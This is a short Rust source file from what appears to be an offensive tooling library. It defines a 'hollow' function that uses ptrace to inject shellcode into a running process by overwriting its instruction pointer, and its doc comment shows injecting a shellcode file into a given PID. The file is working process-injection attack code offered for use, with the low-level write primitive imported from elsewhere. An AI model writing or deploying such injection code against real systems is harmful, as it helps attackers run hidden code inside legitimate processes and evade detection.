//! Techniques that inject a payload into an existing process.

use crate::error::{Error, Result};
use crate::payload::{Inject, Payload, PayloadType};
use crate::primitives::ptrace::ptace_write_rip;

/// Uses ptrace to inject shellcode into a target process by overwriting its RIP register.
/// Only works with shellcode payloads.
///
/// # Arguments
/// * `payload` - A `Payload<Inject>` containing shellcode and target process ID
///
/// # Errors
/// Returns an error if:
/// - The payload type is `Executable` (only shellcode is supported)
/// - Process manipulation fails
///
/// # Examples
/// ```no_run
/// use linc::payload::{Inject, Payload};
/// use linc::techniques::inject;
///
/// // Inject shellcode into process with PID 1234
/// let payload = Payload::<Inject>::from_file("shellcode.bin", 1234).unwrap();
///
/// inject::hollow(payload).unwrap();
/// ```
pub fn hollow(payload: Payload<Inject>) -> Result<()> {
    match payload.payload_type() {
        PayloadType::Executable => {
            return Err(Error::NotImplemented(
                "hollow can not take executables".to_string(),
            ));
        }
        PayloadType::Shellcode => {
            ptace_write_rip(payload.pid(), payload.bytes(), false)?;
        }
    }
    Ok(())
}
